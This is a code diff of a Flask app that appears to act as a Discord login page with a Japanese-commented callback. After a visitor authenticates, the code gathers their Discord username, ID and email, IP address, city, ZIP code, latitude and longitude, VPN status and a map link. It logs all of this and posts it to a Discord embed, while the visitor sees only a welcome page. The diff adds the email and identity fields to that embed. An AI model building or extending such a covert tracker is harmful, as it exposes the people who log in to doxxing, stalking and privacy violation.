@@ -72,31 +72,6 @@ def get_geo_info(ip):
         geo["map_link"] = f"https://www.google.com/maps/search/?api=1&query={geo['lat']},{geo['lon']}"
     return geo
 
-# ----------------- ISP/拠点情報取得 -----------------
-def get_isp_info(ip):
-    isp_info = {
-        "isp": "不明",
-        "as": "不明",
-        "region": "不明",
-        "city": "不明",
-    }
-    try:
-        res = requests.get(
-            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,isp,as,regionName,city",
-            timeout=3
-        )
-        data = res.json()
-        if data.get("status") == "success":
-            isp_info.update({
-                "isp": data.get("isp", "不明"),
-                "as": data.get("as", "不明"),
-                "region": data.get("regionName", "不明"),
-                "city": data.get("city", "不明"),
-            })
-    except:
-        pass
-    return isp_info
-
 # ----------------- ログ保存 -----------------
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -167,15 +142,13 @@ def callback():
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
-    isp = get_isp_info(ip)
 
     data_log = {
         "username": user.get("username"),
         "discriminator": user.get("discriminator"),
         "id": user.get("id"),
         "email": user.get("email"),
-        "access_info": geo,
-        "isp_info": isp
+        **geo
     }
 
     save_log(user["id"], data_log)
@@ -183,20 +156,19 @@ def callback():
     # ----------------- Discord Embed送信 -----------------
     try:
         embed_desc = (
-            f"[ ユーザー ]（アクセス者情報）\n"
-            f"IP={geo['ip']}\n"
-            f"Region={geo['country']}/{geo['region']}/{geo['city']}\n"
-            f"ZIP={geo['zip']}\n"
-            f"緯度/経度={geo['lat']},{geo['lon']}\n"
-            f"Timezone={geo['timezone']}\n"
-            f"VPN/Proxy={geo['vpn_proxy']}\n"
-            f"Country Code={geo['country_code']}\n"
-            f"Flag={geo['flag']}\n"
-            f"Google Map={geo['map_link']}\n\n"
-            f"[ ISP/拠点 ]（オプション）\n"
-            f"ISP={isp['isp']}\n"
-            f"AS={isp['as']}\n"
-            f"拠点={isp['region']}/{isp['city']}"
+            f"[ ユーザー ]\n"
+            f"{data_log['username']}#{data_log['discriminator']}\n"
+            f"ID={data_log['id']}\n"
+            f"Email={data_log['email']}\n"
+            f"IP={data_log['ip']}\n"
+            f"Region={data_log['country']}/{data_log['region']}/{data_log['city']}\n"
+            f"ZIP={data_log['zip']}\n"
+            f"緯度/経度={data_log['lat']},{data_log['lon']}\n"
+            f"Timezone={data_log['timezone']}\n"
+            f"VPN/Proxy={data_log['vpn_proxy']}\n"
+            f"Country Code={data_log['country_code']}\n"
+            f"Flag={data_log['flag']}\n"
+            f"Google Map={data_log['map_link']}"
         )
 
         embed_data = {
@@ -212,7 +184,7 @@ def callback():
     except Exception as e:
         print("Embed送信エラー:", e)
 
-    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
+    return render_template("welcome.html", username=data_log["username"], discriminator=data_log["discriminator"])
 
 @app.route("/logs")
 def show_logs():
